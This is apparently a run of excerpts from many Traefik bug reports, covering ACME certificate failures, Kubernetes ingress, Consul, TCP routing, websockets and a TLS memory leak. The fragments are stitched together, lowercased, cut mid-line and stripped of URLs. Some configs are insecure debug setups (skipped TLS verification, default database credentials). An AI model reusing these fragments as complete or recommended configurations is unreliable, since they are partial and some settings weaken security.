traefik.http.middlewares.no-cache.headers.customresponseheaders.cache-control: "no-cache, no-store, must-revalidate" traefik.http.middlewares.no-cache.headers.customresponseheaders.pragma: "no-cache" traefik.http.middlewares.no-cache.headers.customresponseheaders.expires: "0" image: "traefik:2.0.0-alpha4" ..
command: > --api --global.sendanonymoususage=true --entrypoints='name:http address::80' --entrypoints='name:https address::443' --metrics --metrics.prometheus --providers --providers.file.directory=/etc/traefik/ --providers.docker --providers.docker.swarmmode --providers.docker.exposedbydefault=false --providers.docker.watch --providers.docker.network=project --serverstransport.insecureskipverify --log --log.level=debug --accesslog --global.debug something: deploy: ..
traefik.http.routers.something-tls.middlewares: "no-cache" ...
put together a minimal config to test tcp functionality with redis (see below)
decided a ping test would be the best way to see if it was working to start with
**testing method**
```for i in `seq 1 1000`; do echo 'ping' | nc localhost 6379; done | uniq -c```
- enabled traefik api, creating a frontend protected with a user / password (see reproduction case below)
- fetched the api
i tried to run the `traefik:v2.0-alpine` image on windows docker with lcow support.
i'd like to use traefik's 2.x new tcp routing feature upfront of my mta (postfix)
i've created two separate docker-compose stacks: one for traefik and the other one is a mailu ( stack
traefik service and mailu's frontend service are connected via an external network named *mailu*
i've also replaced mailu stack with a plain postfix docker instance, but the result is the same as for mailu stack.
using docker image of traefik (v1.7.8) , i tried the mesos provider (tested against mini mesos mesos/mesos-mini).
we are notificing rss memory of traefik process running within kubernetes pod container keeps growing, eventually reaching the configured memory limits and getting oomkilled
heap dump pprof profile shows most of the memory accumulated at ' crypto/tls.(*block).reserve /usr/local/go/src/crypto/tls/conn.go'
(pprof) top20
showing nodes accounting for 982.10mb, 96.97% of 1012.75mb total
dropped 227 nodes (cum <= 5.06mb)
showing top 20 nodes out of 97 flat flat% sum% cum cum% 740.49mb 73.12% 73.12% 740.49mb 73.12% crypto/tls.(*block).reserve /usr/local/go/src/crypto/tls/conn.go 73.56mb 7.26% 80.38% 73.56mb 7.26% crypto/tls.server /usr/local/go/src/crypto/tls/tls.go 47.01mb 4.64% 85.02% 47.01mb 4.64% crypto/aes.(*aesciphergcm).newgcm /usr/local/go/src/crypto/aes/aes_gcm.go 30.51mb 3.01% 88.04% 30.51mb 3.01% crypto/aes.newcipher /usr/local/go/src/crypto/aes/cipher_asm.go 15.50mb 1.53% 89.57% 15.50mb 1.53% crypto/tls.(*halfconn).newblock /usr/local/go/src/crypto/tls/conn.go 13.50mb 1.33% 90.90% 13.50mb 1.33% bytes.makeslice /usr/local/go/src/bytes/buffer.go 13mb 1.28% 92.18% 13mb 1.28% syscall.anytosockaddr /usr/local/go/src/syscall/syscall_linux.go 12mb 1.19% 93.37% 12mb 1.19% net.newfd /usr/local/go/src/net/fd_unix.go 11mb 1.09% 94.45% 126.60mb 12.50% crypto/tls.(*conn).readhandshake /usr/local/go/src/crypto/tls/conn.go 8mb 0.79% 95.24% 8mb 0.79% crypto/tls.ekmfrommastersecret /usr/local/go/src/crypto/tls/prf.go 7mb 0.69% 95.94% 7mb 0.69% net.sockaddrtotcp /usr/local/go/src/net/tcpsock_posix.go 5.52mb 0.55% 96.48% 5.52mb 0.55% bufio.newwritersize /usr/local/go/src/bufio/bufio.go 3.50mb 0.35% 96.83% 81.02mb 8.00% crypto/tls.aeadaesgcm /usr/local/go/src/crypto/tls/cipher_suites.go 1.50mb 0.15% 96.97% 123.60mb 12.20% crypto/tls.(*serverhandshakestate).readclienthello /usr/local/go/src/crypto/tls/handshake_server.go 0 0% 96.97% 214.84mb 21.21% bufio.(*reader).peek /usr/local/go/src/bufio/bufio.go 0 0% 96.97% 28.21mb 2.79% bufio.(*reader).read /usr/local/go/src/bufio/bufio.go 0 0% 96.97% 57.20mb 5.65% bufio.(*reader).readline /usr/local/go/src/bufio/bufio.go 0 0% 96.97% 57.20mb 5.65% bufio.(*reader).readslice /usr/local/go/src/bufio/bufio.go 0 0% 96.97% 272.04mb 26.86% bufio.(*reader).fill /usr/local/go/src/bufio/bufio.go 0 0% 96.97% 125.74mb 12.42% bufio.(*writer).flush /usr/local/go/src/bufio/bufio.go
![profile001](
use tcp proxy to pass ssh traffic
i wanted to do a work around issue #4854
there is a problem with using redirectscheme and kubernetescrd provider
so i tried to reference a redirectscheme middleware from the file provider
i wanted to use the redirectscheme middleware to redirect from http to https with kubernetescrd provider
this bug seems to affect redirectregex too.
scale an application that never becomes healthy in marathon
traefik reports traefik_backend_server_up 1 for all backends
run traefik as ingress controller (daemonset) in kubernetes with etcd as a kv-storage backend
traefik version (docker tag): traefik:1.7-alpine i have configured traefik on kubernetes with following configuration (k8s/etcd/acme): ```toml # entrypoints defaultentrypoints = ["https", "http"] # !!! this has to be at the top of the file [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384" ] [entrypoints.monitoring] address = ":8080" # logs loglevel = "warn" [traefiklog] format = "json" # acme [acme] email = "me@example.com" storage = "traefik/acme/account" entrypoint = "https" onhostrule = true caserver = " " # for testing [acme.tlschallenge] # kubernetes [kubernetes] # value of `kubernetes.io/ingress.class` annotation that identifies ingress objects to be processed
# if the parameter is non-empty, only ingresses containing an annotation with the same value are processed
# otherwise, ingresses missing the annotation, having an empty value, or the value `traefik` are processed
ingressclass = "traefik" [etcd] # to store let\'s encrypt certificates endpoint = "etcd:2379" watch = true prefix = "/traefik" useapiv3 = true [respondingtimeouts] # readtimeout is the maximum duration for reading the entire request, including the body
# readtimeout = "5s" # default: "0s" # writetimeout is the maximum duration before timing out writes of the response
writetimeout = "30s" # default: "0s" # idletimeout is the maximum duration an idle (keep-alive) connection will remain idle before closing itself
idletimeout = "300s" # default: "180s" # [forwardingtimeouts] # dialtimeout is the amount of time to wait until a connection to a backend server can be established
# dialtimeout = "30s" # default: "30s" # responseheadertimeout is the amount of time to wait for a server\'s response headers after fully writing the request (including its body, if any)
# responseheadertimeout = "0s" # default: "0s" # admin/monitoring [api] # web administration port
entrypoint = "monitoring" dashboard = true [metrics] [metrics.prometheus] entrypoint = "monitoring" # buckets = [0.1,0.3,1.2,5.0]
but when traefik is trying to get a let's encrypt certificate it serves back the default certificate.
{"level":"error","msg":"error getting acme certificates [test.example.com] : cannot obtain certificates: acme: error -\\u003e one or more domains had a problem:\ [test.example.com] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: incorrect validation certificate for tls-alpn-01 challenge
requested test.example.com from w.x.y.z:443
received 1 certificate(s), first certificate had names \\"32bf782dfd46e7cc3c7eb9618644a519.ddd08ec150005d4b70a05f6fc09250f4.traefik.default, traefik default cert\\", url: \ ","time":"2019-05-07t03:13:17z"}
``` however, if i change the k8s ingress definition for my deployment to using a certificate as a secret it is working fine
thanks for your support!
i am initiating a websocket connection from my browser to a service that runs behind traefik v1.7.9
the service response contains a `sec-websocket-extensions` header but traefik doesn't seem to forward it back to the client.
passed cf_api_email_file=/run/secrets/cf_api_email & cf_api_key_file=/run/secrets/cf_api_key in docker-compose.yml
i am running traefik in a development environment with https endpoints enabled, using the default traefik ssl certificate
i set up the following ingress definition:
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: ingress.kubernetes.io/auth-tls-insecure: "true" ingress.kubernetes.io/auth-type: forward ingress.kubernetes.io/auth-url: ingress.kubernetes.io/is-development: "true" kubernetes.io/ingress.class: traefik labels: traffic-type: external name: test namespace: test
spec: rules: - host: test.local.mydomain.com http: paths: - backend: servicename: test serviceport: http path: /
traefik is configured as a proxy for a webdav server
traefik is configured to match the host name "share.example.org" and is listening on port 443
it proxies requests to the internal webdav server "share-internal.intra.org" on port 80
when a webdav client sends a move command, the following arrives at the webdav server (just the relevant headers): ```
move /somedir/somefile.txt.tmp http/1.1
host: share.example.org
user-agent: go-http-client/1.1
destination:
``` the problem is the destination header
traefik is proxying requests to ` `, so this target server cannot handle ` `.
serving 2000-4000 websocket connections sending a lot of small packets both ways
i have configured traefik to use letsencrypt with wildcard domains using the cloudns provider.
we are using traefik version 1.7.10
our config provider is dynamodb
we have approximately 12.000 frontends and backends
traefik currently runs on a `t3.medium` in aws
for our config file see below.
configured 1 frontend and 1 backend with 1 server without any additional config ```toml
[entrypoints] [entrypoints.http] address = ":8880"
[backends] [backends.backend1] [backends.backend1.servers] [backends.backend1.servers.server0] url = " " [frontends] [frontends.frontend1] entrypoints = ["http", "https"] backend = "backend1" passhostheader = true
``` requested a stylesheet stlye.css
click on "edit page" icon at
```yaml labels: traefik.tcp.routers.something.tls: true
`--global.sendanonymoususage=false`
accessing traefik v2 with an empty tcp connection results in an error being logged
when using zipkin tracing there are b3 headers added
but, sometimes they are missing one digit.
this has already been fixed but this is not working for 1.7.10
i guess, somewhere the build pipeline needs some push to pull the master branch again or something?
using traefik 1.7.8 as daemonset, and gke 1.12.6 with autoscaling.
during scaling up, new traefik pod is started.
i have tried to configure the file provider for traefik2.0-alpha and when using the whoami container to debug i see that some http headers that traefik 1.7 added (x-forwarded-host, x-forwarded-method, x-forwarded-proto, x-forwarded-uri.) is not there
the only header still present is x-forwarded-for.
traefik --help
the `readme` references "play-with-docker" under the quickstart section
however, this link is a 404
i was unable to find a fixed link by googling.
according to the [official documentation]( #redirect-http-to-https), the redirect to https should be straightforward
for gke (google kubernetes) it works right away indeed
for azure kubermetes (aks) it worked once and then after traefik redeployment it didn't get back to normal
whatever i tried didn't work.
the config looks as the following:
apiversion: v1
kind: configmap
metadata: name: traefik-conf namespace: kube-system
data: traefik.toml: | defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [frontends] [frontends.frontend2] backend = "backend1" passhostheader = true # overrides default entry points entrypoints = ["http", "https"] [backends] [backends.backend1] [backends.backend1.servers.server1] url = " "
i'm creating a docker-swarm with traefik as a load balancer and attempting to get an ssl through letsencrypt.
i'm trying to only log 401 and 403 requests to my accesslog
it does not seem to respect the filter, it logs all requests.
i'm using 1.7.9 inside a docker container.
i have set up a docker stack including traefik and nginx
want to use ratelimit labels in my docker-compose.yml for the nginx webservice
i added the labels according to the [docker backend documentation]( #using-docker-compose) which describes the following labels:
traefik.frontend.ratelimit.rateset.<name>.period
traefik.frontend.ratelimit.rateset.<name>.burst
traefik.frontend.ratelimit.rateset.<name>.average
traefik.frontend.ratelimit.extractorfunc
``` i used them as service labels and deploy labels in my docker-compose.yml file, with and without the `<name>` part, but the rate limit was never applied to the container (tested with apache benchmarks) here you can find the code/stack configuration i used (minmal runable example):
*
unable to browse to applications behind traefik proxy as no certificate available and it's not auto-renewed
regenerated cloudflare global api key and tested the key in another application for updating a records and that works so i think this is a traefik problem.
i'm trying to get neo4j working via traefik, but so far i have only been able to make the neo4j browser work, but not been able to login with bolt (bolt://neo4j.domain.com:7687) and get the following error message in the neo4j browser: `serviceunavailable: websocket connection failure
due to security constraints in your web browser, the reason for the failure is not available to this neo4j driver
please use your browsers development console to determine the root cause of ...` here below are the docker-compose files i'm currently using
**traefik docker-compose.yml :** ```
version: '3' services: app: container_name: traefik_app image: traefik restart: always command: --loglevel=error ports: - 80:80 - 443:443 expose: - 8080 volumes: - /var/run/docker.sock:/var/run/docker.sock - ./traefik.toml:/traefik.toml - ./acme.json:/acme.json labels: - traefik.port=8080 - traefik.backend=traefik - traefik.frontend.rule=host:traefik.domain.com - traefik.enable=true networks: - web networks: web: external: true
``` **neo4j docker-compose.yml :** ```
version: \'3\' services: neo4j: container_name: neo4j_app image: neo4j:3.5.3 networks: - web ports: - 7474:7474 - 7687:7687 volumes: - ./data:/data - ./logs:/logs environment: - neo4j_auth=neo4j/neo4j - neo4j_dbms_connector_bolt_tls__level=optional labels: - "traefik.backend=neo4j" - "traefik.docker.network=web" - "traefik.frontend.rule=host: neo4j.domain.com" - "traefik.http.port=7474" - "traefik.enable=true" restart: always networks: web: external: true ```
i configured traefik 1.7.6 config in order to use the x-forwarded-for to resolve the client ip
<!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
an ingress configuration such as the following: ```
apiversion: extensions/v1beta1
kind: ingress
metadata: name: subdomain-backend annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/request-modifier: "addprefix: /subdomain"
spec: rules: - host: subdomain.mysite.com http: paths: - backend: servicename: backend serviceport: http
i'm trying to set timeout parameter in rest provider, but traefik does not recognize it
this is the rest request:
{ "backends": { "myback": { "servers": { "s0": { "url": " ", "weight": 100 } }, "loadbalancer": { "method": "wrr", "stickiness": { "cookiename": "backend" } }, "healthcheck": { "path": "/healthcheck", "interval": "11s", "timeout": "4s" } } }, "frontends": { "myfront": { "entrypoints": [ "http" ], "backend": "myback", "passhostheader": true, "priority": 999, "basicauth": null, "headers": {} } }
<!-- - if possible, use the command `traefik bug`
see
--> ran an instance of `traefik` to route services
i'm trying to secure the dashboard with `oauth2_proxy`
see pusher/oauth2_proxy#46 #
i launch traefik on k8s as ingress controller on **minikube** and on **docker for mac** i create 2 services (servicea, serviceb) (with 3 replicas on each service)
i create 1 ingress with the following annotation
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: traefik.ingress.kubernetes.io/service-weights: | servicea: 30 serviceb: 70 name: ingress
spec: rules: - host: myhost.com http: paths: - backend: servicename: servicea serviceport: 80 path: / - backend: servicename: serviceb serviceport: 80 path: / ```
i use traefik helm inside gke, google lb -> traefik -> uwsgi -> flask when having high pressure i see traefik logs: `500 internal server error` at the same time my backend shows this:
`[uwsgi-body-read] error reading 162 bytes
content-length: 162 consumed: 0 left: 162 message: client closed connection` might be related to:
running 1.6.4 on docker i've setup various domains using letsencrypt, at some point using san certifcates
accessing primary site using https generates non-deterministic certificate errors on various platforms.
- running traefik as a reverse proxy in front of containerized micro services
- traefik itself is run in a docker container as part of the docker swarm (only one node)
- creating some traffic (140mbit/s) by downloading data
added service and ingress as below configuration.
i tried to run a janusgraph through traefik and simulate our load against traefik
janusgraph is a graph database that uses websockets for clients to connect to its server part.
simulation of load means to run a lot websocket requests with large requests and responses
responses are often too large for a single websocket message and are therefore sent via multiple messages
the protocol is explained in detail [here]( #_graph_driver_provider_requirements)
<!-- - if possible, use the command `traefik bug`
see
i have two ingresses, and i want to route traffic from my.domain.com:9090 to service1, and route traffic from my.domain.com:80 to service2
# ingress1 with backend service1
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/frontend-entry-points: 9090 # listen to only 9090 labels: app.kubernetes.io/name: ingress1 name: ingress1
spec: rules: - host: my.domain.com http: paths: - backend: servicename: service1 serviceport: 80 path: /
# ingress2 with backend service2
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/frontend-entry-points: 8080 # listen to only 8080 labels: app.kubernetes.io/name: ingress2 name: ingress2
spec: rules: - host: my.domain.com http: paths: - backend: servicename: service2 serviceport: 80 path: /
we started to get `warning: rpc failed: status{code=internal, description=received unexpected eos on data frame from server., cause=null}`
in our grpc client when using `[retry]` in our traefik config
* we were able to recreate using grpc helloworld example:
this is linked to the issue #4322 and the mr #4326 when the path of the ingress is empty, this is the redirect rule generated : ```
from: myhost$
to: myhost/my-super-app/login
the issue with this regex : `myhost$` never match anything, since refering to the [http 1.1 rfc\'s]( #section-3.2.2) "/" is the minimum required path
so the `from:` should always be `myhost/$`
upgrade consul from 1.4.0 to 1.4.1
traefik instance configured for consul catalog
i have been getting a new environment up with a load balancer
in one case trying a renewal, the renewal succeeded in lego but traefik failed to load the certificate
perhaps a related issue, i have had an expired certificate being served in production after traefik had been running for ~5 months
the behavior described in this issue could very well be the cause of this production failure as well - if traefik is renewing and storing the updated certificate in storage but not actually updating its own configuration correctly
unfortunately, since the certificate is stored in binary i can't look at the details of the certificate in storage - what would be great is if traefik could also persist metadata about the certificates - last successful renewal date, caserver used, domains included, etc
i'm using dns-01 challenge w/ acme v2 and a wildcard
renewed successfully using staging server
change caserver to prod, delete acme object in consul, and restart traefik
renew failed using prod server
change caserver back to staging, delete acme object in consul, and restart traefik
renewed successfully using staging server
change caserver back to prod, delete acme object in consul, and restart traefik
renewed successfully using prod server <!-- - if possible, use the command `traefik bug`
see
i've built a traefik docker image for windows server 2019 / windows 10 1809
someone tried my [docker-compose example]( on a windows 10 1809 machine with stable docker-desktop 2.0.0.2 (docker 18.09.1)
traefik could not communicate with the named pipe of the windows docker engine
see for details how i drilled down the problem before i wrote this issue.
<!-- - if possible, use the command `traefik bug`
see
i've setup my backend and frontend as so..
```toml [backends.dr] [backends.dr.servers.server1] url = " " [backends.dr.servers.server2] url = " " [backends.dr.servers.server3] url = " " [backends.dr.servers.server4] url = " " [backends.dr.loadbalancer] sticky = true [backends.dr.healthcheck] path = "/gateway/health/api/v1/version" interval = "5s" [frontends.dev] backend = "dr" [frontends.dev.routes.test_1] rule = "pathprefixstrip:/hdp/dev/kx;addprefix:/gateway/testdev1"
``` **note**: this works in <1.6.5 but does not in 1.6.5+
**requested url** ```
i'm attempting to use traefik for ingress controlling in my kubernetes cluster, and the external ingressing works fine but when trying to communicate to hosts internally via services if the service is on traefik's ports (80 or 8080) traefik is the endpoint and not the actual service
i'm using these two files to apply the ingress then setting up the services and ingress like below:
```yaml
apiversion: v1
kind: service
metadata: name: jenkins-master labels: app: jenkins-master
spec: type: nodeport ports: - port: 8080 protocol: tcp name: jenkins-master-http - port: 50000 protocol: tcp name: jenkins-master-jnlp selector: app: jenkins-master ---
apiversion: extensions/v1beta1
kind: ingress
metadata: name: jenkins-master
spec: rules: - host: build.[redacted] http: paths: - path: / backend: servicename: jenkins-master serviceport: 8080
``` when trying to connect to jenkins-master from a different container in a different namespace (ie curl jenkins-master.default:8080) i will be greeted with the traefik dashboard and not jenkins
the external ingress to build.[redacted] works as expected though.
apply for a certificate using acme
configure traefik tracing with datadog backend in a service fabric cluster.
i am using traefik as a reverse proxy for apache and apache is hosting large files (say 1-5gb) for downloads.
no action has been taken in fully working traefik container.
about 100 frontends and backends configured via consul kv.
consul is running in a 3 node cluster that traefik queries directly (with watch=true).
i'm trying to configure forward authentication on my traefik install
web apps are accessible at ` `, and i have a simple `http` authentication `post` form at ` `
the latter is my authentication backend, ans is also accessible form ` ` for testing purpose.
start traefik as an ecs service with awsvpc networking enabled on an ec2 cluster.
i'm running a bunch of private and one or two publicly available services using `docker-compose`
traefik is one of the containers and i'm trying to get it to request let's encrypt certificates for each container
i'm using labels in the compose file to direct traefik, basically just an `enable=true` with a host rule on each container
i'm using `onhostrule=true`, the dns-01 challenge and transip as a provider.
set up rfc2136 acme certificate updates.
<!-- - if possible, use the command `traefik bug`
see
simply configuring the `publishedservice` option under `kubernetes.ingressendpoint` causes traefik to crash at startup
the `hostname` option works as advertised and does not cause crashing.
hi, i want to be able to create two different networks on traefik with docker-compose
the first one is frontend where i want to serve the client request and at the same time make another one to use as internal communication but excluding traefik
so some of my dockers are in both networks ( ex: grafana ) and some only in the frontend network
but no matter what i do, i always see on traefik's status the dockers using both network randomly as if `traefik.docker.network` was not working.
i am trying to access with digest authentication and tls enabled
entering the user and password works
but sometimes when click around inside the webapp (kibana) it randomly/suddenly asks for password again.
i'm trying to deploy a traefik stack on docker with consul as a key / value store
my cluster is made of three nodes (three masters) : following this documentation, traefik works perfectly for docker swarm certificates are created and i can route to different services also
no issues at all
but in consul , i could not find any key values and it is empty as seen below
when i click the docker option as below, i can see all services being listed.
kindly let me know if there any additions configs that i have to perfrom.
<!-- - if possible, use the command `traefik bug`
see
configure configfile to use consul with tls: ```toml
endpoint = "localhost:8501"
watch = true
prefix = "frontend" [consul.tls] ca = "/etc/ssl/pki/realms/consul/ca.crt" cert = "/etc/pki/realms/consul/default.crt" key = "/etc/pki/realms/consul/default.key" insecureskipverify = false
``` this contains strictly and only the necessary certificates and ca/intermediate-ca for accessing consul over tls.
during a deployment of an ecs service, all but one task started successfully
the last task reached a pending state, then eventually stopped
aws continued to try to start the final desired task repeatedly (every 15 min after backoff) until it was eventually able to succeed.
- i used this [`traefik.toml`]( and started traefik using `traefik --configfile=traefik.toml`
curl -o traefik.toml; traefik --configfile=traefik.toml - i started the referenced backend using: cd $(mktemp -d); echo "ping http1" > ping; python3 -m http.server 8003 - i used curl to retrieve the `ping` file via traefik, intentionally adding a trailing slash: curl
- running traefik as deployment (ingress controller) in k8s
- having bunch of services targeting no pods (thus having no related endpoints object)
- our setup is specific in way that we downscale tens of deployments to 0 on some schedule to not waste resources of k8s cluster.
prometheus metrics for a given traefik instance often indicate there are open connections on the entrypoint that don't exist, confirmed by `lsof`.
i am attempting to scale up a container, which exposes multiple ports, and for each of the containers to exist under a single named backend
the traefik configuration utilises the segmented configuration notation in order to route the different frontends to the relevant ports exposed on the containers
i have pruned this back to it's simplest form to demonstrate the issue
in running the below i would expect a number of frontends, linked to two backends (app1 and app2) and for there to be two containers in each of the backends
there are, however, a number of frontends with an equal number of backends, each made up of a single container
docker run -d -p 80:80 -p 81:81 -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock traefik:latest --api --docker
docker run -d -l traefik.app1.frontend.rule=host:app1.docker.local -l traefik.app1.port=8000 -l traefik.app1.backend=backend1 jwilder/whoami
docker run -d -l traefik.app1.frontend.rule=host:app1.docker.local -l traefik.app1.port=8000 -l traefik.app1.backend=backend1 jwilder/whoami
docker run -d -l traefik.app2.frontend.rule=host:app2.docker.local -l traefik.app2.port=8000 -l traefik.app2.backend=backend2 jwilder/whoami
docker run -d -l traefik.app2.frontend.rule=host:app2.docker.local -l traefik.app2.port=8000 -l traefik.app2.backend=backend2 jwilder/whoami
``` if i then `curl` request to the different front ends you can see there isn't any round-robin-ing going on between the two containers which should make up the backends: ```
$ curl -h "host:app1.docker.local" localhost
i'm 835402dd612d
$ curl -h "host:app1.docker.local" localhost
i'm 835402dd612d
$ curl -h "host:app1.docker.local" localhost
i'm 835402dd612d
$ curl -h "host:app2.docker.local" localhost
i'm d7ecfb7002cc
$ curl -h "host:app2.docker.local" localhost
i'm d7ecfb7002cc
$ curl -h "host:app2.docker.local" localhost
i'm d7ecfb7002cc
``` if i take the segmentation away and run the following, i see a setup close to what i want i.e
a number of frontends, linked to a single backend (backend1) and two containers as members
clearly, this takes away the ability to have the setup serve content from _app2_
docker run -d -p 80:80 -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock traefik:latest --api --docker
docker run -d -l traefik.frontend.rule=host:docker.local -l traefik.port=8000 -l traefik.backend=backend1 jwilder/whoami
docker run -d -l traefik.frontend.rule=host:docker.local -l traefik.port=8000 -l traefik.backend=backend1 jwilder/whoami
``` it seems as though as soon as you introduced any segmentation, the ability to have multiple containers under a single backend isn't possible.
set up basic auth on a frontend via docker provider
see docker-compose file further below for full config to reproduce this.
then visited the url in the browser
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
install traefik 1.7 for docker swarm or via the kubernetes helm chart
launch the containous/whoami container
configure a dns - i.e
my.domain.com - with both a and aaaa records
configure the docker stack / traefik ingress for whoami.my.domain.com
try to access the container -> via wget
i have an existing traefik file-backed configuration that uses a let's encrypt wildcard cert to secure a number of backends
up until this point, all backends have been http only
however, i'm adding unifi controller and unms backends, **both of which use self-signed certs**
(unms will try to create it's own let's encrypt cert, but that fails in my configuration, so it makes a self-signed one
unifi controller always uses a self-signed cert.) i have a per-subdomain template i use, and i made configs from it to contact the new services on the appropriate port and via https; however, when i attempt to contact the services in the browser, the browser connects to traefik fine, but receives the 'internal server error' message from a misconfigured or unavailable backend
the backend is available in the browser independently, but with an untrusted cert warning due to it being self-signed
after checking the logs and looking at the config example, i added `insecureskipverify = true` to my traefik.toml; however, even after pulling the latest traefik docker image and restarting traefik, this does not have any effect
(note: this was originally mentioned as a comment on #4195
based on the description, i suspect it's the same issue, but as requested, i'm splitting it out.)
trying to setup a new domain (*.some.subdomain.tld
some.subdomain.tld) with the cloudflare acme dns challenge provider
this is the first domain on this new instance, rules file is empty, it creates hostnames with docker labels.
added a wildcard ingress in `namespace: spinnaker` at `2018-11-12t16:48:19z`
traefik is installed and running in `namespace: prod`
`kubectl apply -f spinnaker-api.yml`
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/preserve-host: "true" traefik.ingress.kubernetes.io/priority: "100" labels: app: spin-gate ksonnet.io/component: spinnaker.api name: spin-gate namespace: spinnaker
spec: rules: - host: spinnaker-api.mydomain.com http: paths: - backend: servicename: spin-gate serviceport: 8084 tls: - hosts: - spinnaker-api.mydomain.com secretname: cert-wildcard-mydomain.com
a healthcheck on my container with 1)
``` traefik.backend.healthcheck.path: '/primus?access_token=healthcheck&transport=polling'
``` 1') ```
- "traefik.backend.healthcheck.path=\'/primus?access_token=healthcheck&transport=polling\'"
``` - "traefik.backend.healthcheck.path=/primus?access_token=healthcheck&transport=polling"
<!-- - if possible, use the command `traefik bug`
see
i'm using grpc with h2c protocol.
when grpc server returns correct response -> everything is ok.
when grpc server returns error -> something with headers passing is wrong in traefik (works correctly using different proxy - nghttpx)
<!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
running 2+ backends (docker swarm 18.09) with the label traefik.backend.loadbalancer.swarm=true
i've configured error page over marathon labels, that looks like this:
``` traefik.enable: true traefik.frontend.rule: host:test.example.com traefik.protocol: http traefik.backend.healthcheck.path: /health traefik.frontend.entrypoints: http traefik.backend.loadbalancer.method: drr traefik.frontend.errors.rapi.query: "/" traefik.frontend.errors.rapi.backend: -error traefik.frontend.errors.rapi.status: 500-599
<!-- - if possible, use the command `traefik bug`
see
visit <!-- - if possible, use the command `traefik bug`
see
used comments in a basic auth users file
it looks like traefik is not handling comments at the moment:
#l10
#l130:6
i've got 3 dc's (`dc_a`, `dc_b`, `dc_c`) declared in consul and some services with tags like here: ```
-service1 (tags=[traefik.fronted.rule=host:domaina, traefik.protocol=https, traefik.enable=true])
-servicea (tags=[traefik.fronted.rule=host:domaina, traefik.protocol=https, traefik.enable=true])
-serviceb (tags=[traefik.fronted.rule=host:domainb, traefik.protocol=https, traefik.enable=true]
-servicec (tags=[traefik.fronted.rule=host:domainc, traefik.protocol=https, traefik.enable=true]
i've configured traefik with service discovery in consul, and traefik see only services from `dc_a`.
i'm not sure if this is a traefik or upstream bug but changing my acme provider from `route53` to `gcloud` my configuration generates `409` duplicate resource errors from google when generating certificates for two subdomains
credentials are fine in both cases, the error appears isolated to the acme gcloud provider.
a wildcard certificate (*.domain.com) and a single domain certificate (different.domain.net) configured on the https entrypoint, acme enabled (even if with onhostrule = false)
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] snistrict = true [[entrypoints.https.tls.certificates]] keyfile = "/usr/local/share/ssl/private/wildcard.key" certfile = "/usr/local/share/ssl/certs/wildcard.pem" [[entrypoints.https.tls.certificates]] keyfile = "/usr/local/share/ssl/private/different_domain_com.key" certfile = "/usr/local/share/ssl/certs/different_domain_com.crt"
i am trying to get a wildcard certificate for my traefik system
i have my own dns-server (bind) and i want to use the rfc2136 challenge
i added the required env variables from the provider table to my traefik container.
<!-- - if possible, use the command `traefik bug`
see
i supply traefik with a self-signed wildcard ssl certificate for my internal services
i configure traefik to support acme
i add traefik services both for my internal domain (`*.service.example.local`) and for external domains.
#tls-mutual-authentication mentions `clientcafiles` in the text, but the example shows `clientca.files` as the correct way to set client certs
also, the note below the example shows that `clientcafiles` is deprecated
the leading paragraph for the section should thus change to use `clientca.files` instead in the text.
i am currently trying to get a wildcard certificate for my traefik system
my domain is being hosted at netcup
i added the correct env variables from the [provider table]( #provider) to my traefik container.
i'm using docker container with traefik:1.7.3-alpine in my stack with config:
defaultentrypoints = ["https"]
[entrypoints] [entrypoints.https] address = ":443" [entrypoints.https.tls] ...
[consulcatalog] endpoint = "$nginx_consul" exposedbydefault = false watch=true [consulcatalog.tls] ..
insecureskipverify = true
[api] entrypoint = "traefik" dashboard = true debug = true
``` and i've got some services registered to this consul.
so with these tags, the service is not showing in traefik: ```
dumbtag traefik.frontend.rule=host: example.com.traefik traefik.protocol.https traefik.enable=true
when i move my dumbtag at the end, so it looks like here:
traefik.frontend.rule=host: example.com.traefik traefik.protocol.https traefik.enable=true dumbtag
then it works fine
i have a server with two public ips: `xx.xx.xx.200` - ports 80/443/8080 are free - nothing is listening there
`xx.xx.xx.247` - nginx listening on the ip address (not 0.0.0.0) ```console
$ netstat -luntp | grep -ew "80|443|8080"
tcp 0 0 xx.xx.xx.247:80 0.0.0.0:* listen 18121/nginx: master
tcp 0 0 xx.xx.xx.247:443 0.0.0.0:* listen 18121/nginx: master ```
i'm trying to start traefik only on `xx.xx.xx.200` ip: ```toml
defaultentrypoints = ["https","http"] [entrypoints] [entrypoints.http] address = "xx.xx.xx.200:80" [entrypoints.https] address = "xx.xx.xx.200:443" [entrypoints.https.tls] ```
open the oficial site: find "easy to install", click on "docker image"
the example command there is filled with the unicode char "zero width space" ( and if you copy and paste that to a terminal the command wont work because of that weird char in the example
do an inspect element to see
<!-- - if possible, use the command `traefik bug`
see
i tried to configure traefik in order to setup letsencrypt with docker for wildcard certificates with dns of digital ocean
the project is fairly simple: a single node at `monitor.local.example.com` hosting a prometheus stack where each component is a docker container and listens to different subdomain
eg: alertmanager.monitor.local.example.com
prometheus.monitor.local.example.com
grafana.monitor.local.example.com i kept receiving error messages (as you can see in the next sections) and couldn't make it work.
